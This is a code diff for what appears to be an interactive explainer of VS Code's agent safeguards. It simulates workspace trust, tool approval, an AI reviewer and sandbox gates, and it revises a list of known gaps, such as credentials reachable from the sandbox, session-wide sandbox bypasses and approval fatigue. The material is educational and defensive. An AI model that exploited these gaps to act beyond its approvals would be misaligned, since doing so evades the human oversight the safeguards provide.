+    fetch:["URL approval permits the request. Treat any returned content as untrusted, and remember the request has already reached the site if the fetch succeeded.",["fetchcontent","noundo"]],
+    mcp:["If the tool created an issue, use the issue service’s recovery controls. Restoring the workspace leaves the external issue in place.",["external","noundo"]]
+  }[a.id];
+  push("review","after",review[0],review[1]);
+  return{g:g,ran:true,asks:asks,a:a};
 }
-var LABEL={pass:"Allowed",ask:"VS Code asks you",stop:"Stopped",skip:"Does not apply",judge:"AI reviewer decides",open:"Sandbox is off",after:"After execution"};
+var LABEL={pass:"Allowed",ask:"VS Code asks you",stop:"Stopped",judge:"AI reviewer approves",open:"Sandbox is off",covered:"Server is sandboxed",after:"If the action succeeds"};
 function verdict(r){
   if(!r.ran){
-    if(r.why==="trust") return["Result: the agent is turned off.","The action was blocked."];
-    if(r.why==="fence") return["Result: blocked by the sandbox.","The requested access was blocked. An unsandboxed retry is disabled."];
-    if(r.why==="fence-no") return["Result: blocked by the sandbox. You said no to running it outside.","The action was blocked."];
-    return["Result: stopped. You said no.","The action was blocked."];
+    if(r.why==="trust") return["Simulated result: agents are disabled in this workspace.",""];
+    if(r.why==="fence") return["Simulated result: blocked by the sandbox.","Requests to run outside the sandbox are disabled."];
+    if(r.why==="fence-no") return["Simulated result: blocked by the sandbox.","You declined the request to run outside it."];
+    return["Simulated result: tool call stopped.","You declined the tool request."];
   }
-  var judged=r.g.some(function(x){return x.state==="judge"});
-  var how=r.asks===0?(judged?"Result: the action is permitted. The AI reviewer approved it.":"Result: the action is permitted. VS Code did not ask you."):r.asks===1?"Result: the action is permitted. You approved it.":"Result: the action is permitted. You approved it twice.";
-  return[how,r.a.done];
+  var approval=r.g[1].state,sandbox=r.g[2].state;
+  var how=approval==="judge"?"The AI reviewer approved the tool call.":approval==="ask"?"You approved the tool call.":"";
+  if(sandbox==="ask") how+=(how?" ":"")+"You approved the request to run outside the sandbox.";
+  if(!how) how="VS Code did not ask you.";
+  return["Simulated result: the action is permitted.",how+" "+r.a.done];
 }
 
-var gatesEl=document.getElementById("gates"),bot=document.getElementById("bot"),timer=[];
+var gatesEl=document.getElementById("gates"),bot=document.getElementById("bot"),timer=[],botGate=0;
+function positionBot(){
+  bot.style.transform="translateY("+(gatesEl.children[botGate].offsetTop+20)+"px)";
+}
 function render(animate){
   var r=evaluate(st),v=verdict(r),items=gatesEl.children,i,last=0;
   timer.forEach(clearTimeout);timer=[];
@@ -441,10 +475,10 @@ function render(animate){
   function show(i){
     var li=items[i],x=byGate[li.dataset.g],out=li.querySelector(".out");
     li.className="gate "+x.state;
-    out.innerHTML='<p class="state">'+LABEL[x.state]+'</p><p class="say">'+x.say+'</p>'+x.qs.map(quote).join("");
+    out.innerHTML='<p class="state">'+LABEL[x.state]+'</p><p class="say">'+(x.tag?'<a class="evidence-tag" href="#h-tag-key">'+x.tag+'</a> ':"")+x.say+'</p>'+x.qs.map(quote).join("");
   }
   function moveBot(i,final){
-    bot.style.transform="translateY("+(items[i].offsetTop+20)+"px)";
+    botGate=i;positionBot();
     var x=byGate[items[i].dataset.g];
     bot.className="bot"+(final&&!r.ran?" stop":"");
     bot.textContent=!final?(x.state==="ask"?"[•_?]":"[•_•]"):(r.ran?(r.asks?"[•_•]":"[^_^]"):"[x_x]");
@@ -468,10 +502,9 @@ function render(animate){
   })(i);
 }
 function sync(){
-  var a=ACTS.filter(function(x){return x.id===st.act})[0],term=a.kind==="term";
   var base=JSON.stringify(evaluate(st));
   function live(k){return OPTS[k].some(function(o){var c={};for(var x in st)c[x]=st[x];c[k]=o[0];return JSON.stringify(evaluate(c))!==base})}
-  ["level","judge","env","sandbox","net","esc","answer"].forEach(function(k){document.getElementById("f-"+k).disabled=!live(k)});
+  ["level","judge","env","sandbox","net","esc","answer","retry"].forEach(function(k){document.getElementById("f-"+k).disabled=!live(k)});
   Array.prototype.forEach.call(document.querySelectorAll("#ctl input"),function(el){el.checked=st[el.name]===el.value});
 }
 // build controls
@@ -480,16 +513,19 @@ document.getElementById("f-act").insertAdjacentHTML("beforeend",ACTS.map(functio
 }).join(""));
 Array.prototype.forEach.call(document.querySelectorAll(".opts"),function(el){
   var k=el.dataset.k;
-  if(SETS[k]) el.insertAdjacentHTML("beforebegin",'<a class="set" href="'+D+S[SETS[k][1]]+'#:~:text='+SETS[k][0]+'">'+SETS[k][0]+'</a>');
+  if(SETS[k]){
+    var setting=SETS[k],label=setting[2]?setting[2]+": ":"";
+    el.insertAdjacentHTML("beforebegin",'<a class="set" href="'+D+S[setting[1]]+'#:~:text='+setting[0]+'">'+label+setting[0]+'</a>');
+  }
   el.innerHTML=OPTS[k].map(function(o){return '<label><input type="radio" name="'+k+'" value="'+o[0]+'"><span>'+o[1]+'</span></label>'}).join("");
 });
 document.getElementById("presets").innerHTML=PRESETS.map(function(p,i){return '<button type="button" data-i="'+i+'">'+p[0]+'</button>'}).join("");
 document.getElementById("ctl").addEventListener("change",function(e){st[e.target.name]=e.target.value;sync();render(true)});
 document.getElementById("presets").addEventListener("click",function(e){
   var b=e.target.closest("button");if(!b)return;
-  var p=PRESETS[+b.dataset.i][1];for(var k in p)st[k]=p[k];sync();render(true);
+  Object.assign(st,DEFAULTS,PRESETS[+b.dataset.i][1]);sync();render(true);
 });
-window.addEventListener("resize",function(){render(false)});
+window.addEventListener("resize",positionBot);
 
 // static lists
 var HOLES=[
@@ -499,8 +535,8 @@ var HOLES=[
  ["Assisted permissions lets an AI reviewer decide, and it can be wrong.","assistedrisk"],
  ["Restricted Mode does not hold back an extension that chooses to ignore it.","ext"],
  ["A Git worktree keeps code changes apart. It does not limit what a command can reach.","worktree"],
- ["Trusting a folder also lets the MCP servers it ships with start.","mcp"],
- ["Git and GitHub CLI credentials are available to sandboxed commands.","creds"],
+ ["In a trusted workspace, servers from <code>.vscode/mcp.json</code> or <code>.mcp.json</code> can start without a separate MCP trust prompt. Tool approval applies to the call.","mcp"],
+ ["Default credential settings let sandboxed tools use your account for HTTPS Git operations and the GitHub CLI.","creds"],
  ["A session-wide approval to run outside the sandbox removes its limits for later commands.","sessbypass"],
  ["The sensitive-file rules do not stop file reads, and do not catch every write a terminal command makes.","sensrules"],
  ["Repeated prompts can make risky requests easier to overlook.","fatigue"]
